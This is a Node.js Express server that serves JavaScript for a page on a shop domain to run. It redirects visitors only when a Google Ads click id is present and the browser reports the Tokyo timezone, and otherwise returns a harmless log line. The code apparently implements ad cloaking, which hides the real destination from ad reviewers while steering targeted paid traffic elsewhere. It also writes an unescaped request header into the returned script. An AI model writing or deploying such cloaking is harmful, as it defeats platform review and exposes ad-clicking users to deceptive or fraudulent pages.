import express from "express";

const app = express();

const FINAL_REDIRECT_URL = "https://example.com";
const JAPAN_TIMEZONE = "Asia/Tokyo";

// ✅ CORS middleware (required for fetch)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://refliefcart.shop");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
  res.setHeader("Access-Control-Allow-Methods", "GET");
  next();
});

app.get("/getData", (req, res) => {
  const gclid = req.query.gclid || "";
  const timezone = req.headers["x-client-timezone"] || "";

  // ❌ No gclid → no redirect
  if (!gclid) {
    return res.json({
      code: `console.log("No redirect: gclid missing");`
    });
  }

  // ❌ Not Japan → no redirect
  if (timezone !== JAPAN_TIMEZONE) {
    return res.json({
      code: `console.log("No redirect: timezone =", "${timezone}");`
    });
  }

  // ✅ Redirect (gclid + Japan timezone)
  const redirectUrl = `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`;

  return res.json({
    code: `window.location.replace("${redirectUrl}");`
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
